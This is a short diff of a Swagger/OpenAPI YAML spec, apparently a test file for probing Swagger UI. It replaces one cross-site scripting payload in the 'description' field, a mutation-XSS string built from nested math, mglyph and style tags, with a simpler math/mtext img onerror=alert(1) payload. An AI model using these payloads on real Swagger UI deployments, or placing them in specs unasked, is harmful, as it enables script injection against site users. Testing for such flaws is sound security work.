@@ -2,9 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Swagger UI
-  description: >
-    <math><mtext><table><mglyph><style><!--</style>
-    <img title="--></style><img src=1 onerror=alert(1)>">
+  description: <math><mtext></p><img src=x onerror=alert(1)></mtext></math>
 paths:
   /Login_Page_RelicHunt3r:
     post:
